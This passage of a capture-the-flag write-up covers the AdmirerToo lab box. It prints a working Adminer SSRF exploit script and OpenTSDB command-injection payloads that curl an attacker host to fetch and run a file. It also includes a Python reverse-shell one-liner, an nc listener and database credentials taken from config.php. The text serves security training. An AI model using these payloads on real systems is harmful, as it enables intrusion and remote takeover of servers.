<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adminer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;auth[driver]&#x27;</span>: <span class="string">&#x27;elastic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;auth[server]&#x27;</span>: <span class="string">&#x27;10.10.14.67&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s = requests.Session()</span><br><span class="line">        r = s.post(<span class="string">&quot;http://db.admirer-gallery.htb/&quot;</span>, data)</span><br><span class="line">        soup = BeautifulSoup(r.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> soup.find(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;error&#x27;</span>&#125;).text</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPRequestHandler</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, redirect, *args</span>):</span></span><br><span class="line">        self.redirect = redirect</span><br><span class="line">        BaseHTTPRequestHandler.__init__(self, *args)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.send_response(<span class="number">301</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Location&#x27;</span>, self.redirect)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, port, redirect</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">*args</span>):</span></span><br><span class="line">            HTTPRequestHandler(redirect, *args)</span><br><span class="line">        httpd = HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(port)), handler)</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Running redirect HTTP Server to <span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    thread = Thread(target=Server, args=(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]), daemon=<span class="literal">True</span>)</span><br><span class="line">    thread.start()</span><br><span class="line">    ssrf_result = Adminer().connect()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[+] SSRF return:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ssrf_result)</span><br></pre></td></tr></table></figure>

<p>Now we can run it with the following command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 http://127.0.0.1:80</span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:80</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:12:38] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br><span class="line">  		&lt;title&gt;Admirer&lt;/title&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>A typical way to exploit SSRF would be to make connections to internal-only services within the box infrastructure. The issue is, we don’t know what kind of services are running there. We could brute-force to find the open ports but this will be a pain… </p>
<p>I decided to take a step back and while looking back at my recon phase I noticed that out of habits I didn’t use <code>sudo</code> to run <code>nmap</code>, for once not running a program as root can be a bad habits since some discovery methods used by <code>nmap</code> (UDP port scanning) rely on the root privilege to work properly. And indeed, if we restart <code>nmap</code> as root, we find a new port <code>4242</code> being marked as “filtered”. </p>
<blockquote>
<p><strong>Filtered Port:</strong> Nmap cannot determine whether the port is open because packet<br>filtering (firewall) prevents its probes from reaching the port. The filtering<br>could be from a dedicated firewall device, router rules, or host-based firewall<br>software.<br><a target="_blank" rel="noopener" href="https://nmap.org/book/man.htm">https://nmap.org/book/man.htm</a>l</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nmap -p- -sV -sC admirertoo.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 14:34 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> admirertoo.htb (10.129.111.234)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65530 closed tcp ports (reset)</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</span><br><span class="line">|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</span><br><span class="line">|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</span><br><span class="line">80/tcp    open     http           Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">4242/tcp  filtered vrml-multi-use</span><br><span class="line">16010/tcp filtered unknown</span><br><span class="line">16030/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>Let’s see if we can exploit the SSRF vulnerability against the service running on port <code>4242</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 http://127.0.0.1:4242</span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:21:12] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=content-type content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;&lt;title&gt;OpenTSDB&lt;/title&gt;</span><br><span class="line">&lt;style&gt;&lt;!--</span><br><span class="line">body&#123;font-family:arial,sans-serif;margin-left:2em&#125;A.l:link&#123;color:<span class="comment">#6f6f6f&#125;A.u:link&#123;color:green&#125;.fwf&#123;font-family:monospace;white-space:pre-wrap&#125;//--&gt;&lt;/style&gt;&lt;script type=text/javascript language=javascript src=s/queryui.nocache.js&gt;&lt;/script&gt;&lt;/head&gt;</span></span><br><span class="line">&lt;body text=<span class="comment">#000000 bgcolor=#ffffff&gt;&lt;table border=0 cellpadding=2 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td rowspan=3 width=1% nowrap&gt;&lt;img src=s/opentsdb_header.jpg&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=#507e9b&gt;&lt;b&gt;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;div id=queryuimain&gt;&lt;/div&gt;&lt;noscript&gt;You must have JavaScript enabled.&lt;/noscript&gt;&lt;iframe src=javascript:&#x27;&#x27; id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0&gt;&lt;/iframe&gt;&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td class=subg&gt;&lt;img alt=&quot;&quot; width=1 height=6&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>It works! It seems to be a web server. The page title refers to an <code>OpenTSDB</code> application. Never heard of it before:</p>
<blockquote>
<p>OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.<br><a target="_blank" rel="noopener" href="http://opentsdb.net/">http://opentsdb.net/</a></p>
</blockquote>
<h3 id="Adminer-SSRF-→-OpenTSBD-RCE"><a href="#Adminer-SSRF-→-OpenTSBD-RCE" class="headerlink" title="Adminer SSRF → OpenTSBD RCE"></a>Adminer SSRF → OpenTSBD RCE</h3><p>After another quick Google search we stumble upon a Remote Code Execution Vulnerability in OpenTSBD:</p>
<blockquote>
<p><strong>CVE-2020-35476</strong>: A remote code execution vulnerability occurs in OpenTSDB through 2.4.0 via command injection in the yrange parameter. The yrange value is written to a gnuplot file in the /tmp directory. This file is then executed via the <a target="_blank" rel="noopener" href="http://mygnuplot.sh/">mygnuplot.sh</a> shell script. (tsd/GraphHandler.java attempted to prevent command injections by blocking backticks but this is insufficient.)<br><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2020-35476/">https://www.cvedetails.com/cve/CVE-2020-35476/</a></p>
</blockquote>
<p>Let’s see if the version running on the box is vulnerable.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 http://127.0.0.1:4242/api/version</span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/api/version</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:27:05] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&#123;[...]<span class="string">&quot;version&quot;</span>:<span class="string">&quot;2.4.0&quot;</span>,<span class="string">&quot;full_revision&quot;</span>:<span class="string">&quot;14ab3ef8a865816cf920aa69f2e019b7261a7847&quot;</span>,<span class="string">&quot;repo_status&quot;</span>:<span class="string">&quot;MINT&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;hobbes&quot;</span>,<span class="string">&quot;branch&quot;</span>:<span class="string">&quot;master&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;1545014415&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Bingo! It’s vulnerable. Let’s try to reproduce the <a target="_blank" rel="noopener" href="https://github.com/OpenTSDB/opentsdb/issues/2051">Proof-of-Concept</a>.</p>
<p>First we need to open a simple Python HTTP server - if the server get a connection from the box it means we achieved RCE:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>Then we build a simple payload that will connect to our sever (<code>curl 10.10.14.67:8000</code>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 <span class="string">&quot;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl+10.10.14.67%3A8000&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&quot;</span></span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(<span class="string">&#x27;curl+10.10.14.67%3A8000&#x27;</span>)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:43:13] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&#123;<span class="string">&quot;err&quot;</span>:<span class="string">&quot;java.lang.RuntimeException: Unexpected exception\n\tat net.opentsdb.core.TSQuery.buildQueries(TSQuery.java:224) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.GraphHandler.doGraph(GraphHandler.java:172) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.GraphHandler.execute(GraphHandler.java:123) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.RpcHandler.handleHttpQuery(RpcHandler.java:282) [tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.RpcHandler.messageReceived(RpcHandler.java:133) [tsdb-2.4.0.jar:14ab3ef]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Fina</span></span><br></pre></td></tr></table></figure>

<p><code>OpenTSBD</code> returns an error message. It’s a pain to read it but we can understand that the metric <code>cpu.nice</code> we used from the vulnerability PoC is not available on this instance (<code>No such name for &#39;metrics&#39;: &#39;sys.cpu.nice’</code>). </p>
<p>Following the <a target="_blank" rel="noopener" href="http://opentsdb.net/docs/build/html/api_http/suggest.html">documentation</a> we can find an endpoint to list available <code>metrics</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 <span class="string">&#x27;http://127.0.0.1:4242/api/suggest?type=metrics&#x27;</span></span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/api/suggest?<span class="built_in">type</span>=metrics</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:48:46] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">[<span class="string">&quot;http.stats.web.hits&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>Perfect, let’s now replace <code>sys.cpu.nice</code> with <code>http.stats.web.hits</code> in our payload and retry:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-<span class="number">2021</span>-<span class="number">21311.</span>py <span class="number">80</span> <span class="string">&quot;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl+10.10.14.67%3A8000&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&quot;</span></span><br><span class="line">[+] Running redirect HTTP Server to http:<span class="comment">//127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl+10.10.14.67%3A8000&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span></span><br><span class="line"><span class="number">10.129</span><span class="number">.111</span><span class="number">.234</span> - - [<span class="number">30</span>/Apr/<span class="number">2022</span> <span class="number">16</span>:<span class="number">50</span>:<span class="number">30</span>] <span class="string">&quot;GET / HTTP/1.0&quot;</span> <span class="number">301</span> -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="keyword">return</span>:</span><br><span class="line">&#123;<span class="string">&quot;plotted&quot;</span>:<span class="number">4</span>,<span class="string">&quot;timing&quot;</span>:<span class="number">608</span>,<span class="string">&quot;etags&quot;</span>:[[<span class="string">&quot;host&quot;</span>]],<span class="string">&quot;points&quot;</span>:<span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Bingo! We receive a connection on our HTTP server:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:50:31] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>It’s time to update our payload to a reverse shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.67&quot;</span>,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>Let’s now open our listener and run our urlencoded payload (<code>curl 10.10.14.67:8000/hg8.py -o /tmp/hg8.py &amp;&amp; python /tmp/hg8.py</code>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 <span class="string">&quot;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl%2010.10.14.67%3A8000%2Fhg8.py%20-o%20%2Ftmp%2Fhg82.py%3Bpython%20%2Ftmp%2Fhg82.py&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&quot;</span></span><br><span class="line"></span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(<span class="string">&#x27;curl%2010.10.14.67%3A8000%2Fhg8.py%20-o%20%2Ftmp%2Fhg82.py%3Bpython%20%2Ftmp%2Fhg82.py&#x27;</span>)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 17:12:54] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br></pre></td></tr></table></figure>

<p>We receive a connection and our first shell on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br><span class="line">Connection received on admirertoo.htb 58676</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">opentsdb@admirertoo:/$ id</span></span><br><span class="line"><span class="string">uid=1000(opentsdb) gid=1000(opentsdb) groups=1000(opentsdb)</span></span><br></pre></td></tr></table></figure>

<h3 id="Privilege-escalation-→-jennifer-user"><a href="#Privilege-escalation-→-jennifer-user" class="headerlink" title="Privilege escalation → jennifer user"></a>Privilege escalation → jennifer user</h3><p>Listing <code>/home/</code> and <code>/etc/passwd</code> to find the user and flag location:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/$ ls /home/</span><br><span class="line">jennifer</span><br></pre></td></tr></table></figure>

<p>To get a user flag we will need to find a way to pivot to <code>jennifer</code> user.</p>
<p>While doing the usual recon we notice that a service is running on port <code>8080</code> and probably connected to MySQL instance on port <code>3306</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/$ netstat -tulpn | grep LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::16010                :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::4242                 :::*                    LISTEN      554/java</span><br><span class="line">tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::16030                :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>

<p>Unfortunately the port is still filtered and we can’t access it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/$ curl 127.0.0.1:8080</span><br><span class="line">curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused</span><br></pre></td></tr></table></figure>

<h3 id="OpenCATS-database"><a href="#OpenCATS-database" class="headerlink" title="OpenCATS database"></a>OpenCATS database</h3><p>After the usual recon we find in the <code>/opt</code> folder an application called <code>openCATS</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/opt/opencats$ cat README.md</span><br><span class="line"><span class="comment"># OpenCATS</span></span><br><span class="line">[![Codacy Badge](https://api.codacy.com/project/badge/Grade/948d67033d624e9382a332af20339c00)](https://www.codacy.com/app/OpenCATS/OpenCATS?utm_source=github.com&amp;amp;utm_medium=referral&amp;amp;utm_content=opencats/OpenCATS&amp;amp;utm_campaign=Badge_Grade)</span><br><span class="line">[![Build Status](https://travis-ci.org/opencats/OpenCATS.png)](https://travis-ci.org/opencats/OpenCATS)</span><br><span class="line"></span><br><span class="line">OpenCATS is a Free and Open Source Candidate/Applicant Tracking System designed <span class="keyword">for</span> Recruiters to manage recruiting process from job posting, candidate application, through to candidate selection and submission.</span><br><span class="line"></span><br><span class="line">More details:</span><br><span class="line">http://www.opencats.org</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>It’s probably safe to guess this is the app running on port 8080.</p>
<p>Reading through the source code we can quickly retrieve the MySQL database credentials:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/opt/opencats$ head /opt/opencats/config.php</span><br><span class="line">[...]</span><br><span class="line">define(<span class="string">&#x27;DATABASE_USER&#x27;</span>, <span class="string">&#x27;cats&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_PASS&#x27;</span>, <span class="string">&#x27;adm1r3r0fc4ts&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_NAME&#x27;</span>, <span class="string">&#x27;cats_dev&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>Let’s connect to the database to see if we can find some information on <code>jennifer</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/tmp$ mysql -u cats -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; b SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cats_dev           |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; USE cats_dev</span><br><span class="line">Database changed</span><br><span class="line">MariaDB 